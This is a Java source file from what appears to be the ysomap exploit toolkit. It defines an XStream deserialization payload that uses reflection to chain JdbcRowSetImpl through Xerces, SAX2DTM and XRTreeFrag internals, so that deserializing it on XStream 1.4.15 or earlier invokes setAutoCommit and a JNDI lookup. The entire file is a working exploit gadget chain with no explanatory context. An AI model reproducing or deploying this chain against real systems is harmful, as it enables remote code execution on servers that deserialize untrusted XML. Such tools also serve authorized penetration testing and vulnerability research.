package ysomap.payloads.xstream;

import com.sun.org.apache.xml.internal.dtm.DTM;
import com.sun.org.apache.xml.internal.dtm.DTMManager;
import com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces;
import com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM;
import com.sun.org.apache.xpath.internal.XPathContext;
import com.sun.org.apache.xpath.internal.objects.DTMXRTreeFrag;
import com.sun.org.apache.xpath.internal.objects.XRTreeFrag;
import com.sun.rowset.JdbcRowSetImpl;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Require;
import ysomap.bullets.jdk.JdbcRowSetImplBullet;
import ysomap.common.annotation.Targets;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import java.lang.reflect.Method;

/**
 * @author wh1t3P1g
 * @since 2021/1/5
 */
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.15"})
@Require(bullets = {"JdbcRowSetImplBullet"}, param = false)
public class XercesValue extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JdbcRowSetImplBullet.newInstance(args);
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof JdbcRowSetImpl;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        ReflectionHelper.setFieldValue(obj, "iMatchColumns", null);
        ReflectionHelper.setFieldValue(obj, "strMatchColumns", null);
        Class<?> cls =  Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Method method = cls.getDeclaredMethod("setAutoCommit", new Class<?>[]{boolean.class});
        IncrementalSAXSource_Xerces xerces = new IncrementalSAXSource_Xerces();
        ReflectionHelper.setFieldValue(xerces, "fConfigSetInput", method);
        ReflectionHelper.setFieldValue(xerces, "fConfigParse", method);
        ReflectionHelper.setFieldValue(xerces, "fPullParserConfig", obj);
        ReflectionHelper.setFieldValue(xerces, "fIncrementalParser", null);
        ReflectionHelper.setFieldValue(xerces, "fConfigSetByteStream", null);
        ReflectionHelper.setFieldValue(xerces, "fConfigSetCharStream", null);
        ReflectionHelper.setFieldValue(xerces, "fConfigSetEncoding", null);
        ReflectionHelper.setFieldValue(xerces, "fConfigInputSourceCtor", null);
        ReflectionHelper.setFieldValue(xerces, "fReset", null);

        SAX2DTM sax2DTM = new SAX2DTM(DTMManager.newInstance(null), null, 0, null, null, false);
        ReflectionHelper.setFieldValue(sax2DTM, "m_incrementalSAXSource", xerces);
        ReflectionHelper.setFieldValue(sax2DTM, "m_endDocumentOccured", false);
        ReflectionHelper.setFieldValue(sax2DTM, "m_size", -10086);
        ReflectionHelper.setFieldValue(sax2DTM, "m_exptype", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_firstch", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_nextsib", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_prevsib", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_parent", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_mgr", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_dataOrQName", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_dtmIdent", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_chars", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_data", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_parents", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_contextIndexes", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_valuesOrPrefixes", null);
        ReflectionHelper.setFieldValue(sax2DTM, "m_expandedNameTable", null);
        Object mgrDefault = ReflectionHelper.getFieldValue(sax2DTM, "m_mgrDefault");
        ReflectionHelper.setFieldValue(mgrDefault, "m_dtms", new DTM[1]);
        ReflectionHelper.setFieldValue(mgrDefault, "m_dtm_offsets", null);
        ReflectionHelper.setFieldValue(mgrDefault, "m_expandedNameTable", null);

        DTMXRTreeFrag dtmxrTreeFrag = new DTMXRTreeFrag(1, new XPathContext());
        ReflectionHelper.setFieldValue(dtmxrTreeFrag, "m_dtm", sax2DTM);
        ReflectionHelper.setFieldValue(dtmxrTreeFrag, "m_xctxt", null);
        XRTreeFrag xrTreeFrag = new XRTreeFrag(1, new XPathContext());
        ReflectionHelper.setFieldValue(xrTreeFrag, "m_DTMXRTreeFrag", dtmxrTreeFrag);

        return PayloadHelper.makeTreeSetWithXString(xrTreeFrag);
    }

}
